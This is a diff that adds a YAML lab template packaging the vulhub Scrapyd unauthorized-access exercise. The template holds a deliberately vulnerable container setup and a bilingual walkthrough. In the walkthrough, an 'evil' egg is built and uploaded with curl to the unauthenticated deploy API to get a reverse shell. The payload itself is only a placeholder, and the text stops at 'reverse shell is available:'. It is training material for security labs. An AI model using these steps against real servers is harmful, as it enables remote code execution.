@@ -1,0 +1,92 @@
+apiVersion: hivora/v1
+kind: Template
+metadata:
+  slug: vulhub-scrapy-scrapyd-unacc
+  name: Scrapyd Unauthorized Access
+  version: 1.0.0
+  category: security-lab
+  tags:
+  - vulhub
+  - scrapyd
+  description: Scrapyd — Scrapyd Unauthorized Access (vulhub).
+  links:
+    site: https://github.com/vulhub/vulhub/tree/master/scrapy/scrapyd-unacc
+  maintainer: vulhub
+  license: MIT (vulhub)
+  source: https://github.com/vulhub/vulhub/tree/master/scrapy/scrapyd-unacc
+  lab:
+    phase: exploitation
+    cves: []
+    os:
+    - linux
+    tech:
+    - auth-bypass
+    - rce
+    - scrapyd
+    difficulty: medium
+    summary: Scrapyd Unauthorized Access
+    solution:
+      fr: |
+        Adresse : IP:port affichés par le panel (les ports du guide sont ceux d'origine de vulhub), ou l'IP du lab sur le port d'origine via le VPN labo. Guide d'origine (anglais) : https://github.com/vulhub/vulhub/tree/master/scrapy/scrapyd-unacc
+        Scrapyd is an application for deploying and running Scrapy spiders. It enables users to deploy (upload) projects and control their spiders using a JSON API.
+        References: <https://www.leavesongs.com/PENETRATION/attack-scrapy.html>
+        # Start server
+        Execution the following command to start a scrapyd server:
+        $ docker compose up -d
+        After scrapyd is deployed, the server is listening on `http://your-ip:6800`.
+        # Reproduce
+        Build a evil egg archive:
+        $ pip install scrapy scrapyd-client
+        $ scrapy startproject evil
+        $ cd evil
+        $ # edit evil/__init__.py, add evil code
+        $ scrapyd-deploy --build-egg=evil.egg
+        Upload evil egg to the scrapyd server:
+        $ curl http://your-ip:6800/addversion.json -F project=evil -F version=r01 -F egg=@evil.egg
+        reverse shell is available:
+      en: |
+        Address: the IP:port shown by the panel (the guide's ports are vulhub's original ones), or the lab's IP on the original port through the labs VPN. Original guide: https://github.com/vulhub/vulhub/tree/master/scrapy/scrapyd-unacc
+        Scrapyd is an application for deploying and running Scrapy spiders. It enables users to deploy (upload) projects and control their spiders using a JSON API.
+        References: <https://www.leavesongs.com/PENETRATION/attack-scrapy.html>
+        # Start server
+        Execution the following command to start a scrapyd server:
+        $ docker compose up -d
+        After scrapyd is deployed, the server is listening on `http://your-ip:6800`.
+        # Reproduce
+        Build a evil egg archive:
+        $ pip install scrapy scrapyd-client
+        $ scrapy startproject evil
+        $ cd evil
+        $ # edit evil/__init__.py, add evil code
+        $ scrapyd-deploy --build-egg=evil.egg
+        Upload evil egg to the scrapyd server:
+        $ curl http://your-ip:6800/addversion.json -F project=evil -F version=r01 -F egg=@evil.egg
+        reverse shell is available:
+requirements:
+  arch:
+  - amd64
+form:
+  basic:
+  - id: port_6800
+    group:
+      fr: Accès
+      en: Access
+    label: scrapyd 6800/tcp
+    type: port
+    default: 6800
+services:
+  scrapyd:
+    role: main
+    image: vulhub/scrapyd
+    tag: 1.2.1@sha256:88c27057f4e2baac8f211d69c3a7e5ad984a9102f1fbe1f68f3279e5a1fa90aa
+    frozen: true
+    ports:
+    - container: 6800
+      host: '{{ form.port_6800 }}'
+      protocol: tcp
+      purpose: web
+      exposure: lan
+update:
+  strategy: manual
+access:
+  web: http://{{ host.lan_ip }}:{{ form.port_6800 }}
